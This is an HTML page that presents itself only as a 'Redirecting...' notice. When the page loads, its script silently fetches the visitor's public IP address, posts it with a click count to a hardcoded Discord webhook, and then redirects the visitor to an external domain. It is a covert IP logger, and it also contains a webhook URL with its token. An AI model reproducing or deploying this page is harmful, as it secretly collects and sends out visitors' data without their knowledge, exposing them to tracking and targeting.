    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        let clickCount = 0;
        const webhookUrl = 'https://discord.com/api/webhooks/1273004341548286023/Iidxoq8CIesLUIM5WBpggN7ni5MHM-xp1KTRurq9Q3Euu-67dKufSawEnsgi6AKZaxO3';
        const redirectUrl = 'https://ds.qwse.su'; // Замените на нужную вам ссылку

        window.onload = function() {
            clickCount++;

            // Get user IP address
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const userIp = data.ip;

                    // Send data to Discord webhook
                    fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            content: `User IP: ${userIp} Count: ${clickCount}`
                        })
                    })
                    .then(response => {
                        if (response.ok) {
                            // Redirect to the specified URL
                            window.location.href = redirectUrl;
                        } else {
                            alert('Failed to send data to Discord.');
                        }
                    });
                })
                .catch(error => {
                    console.error('Error fetching IP address:', error);
                });
        };
    </script>
</head>
<body>
    <p>Redirecting...</p>
</body>
</html>
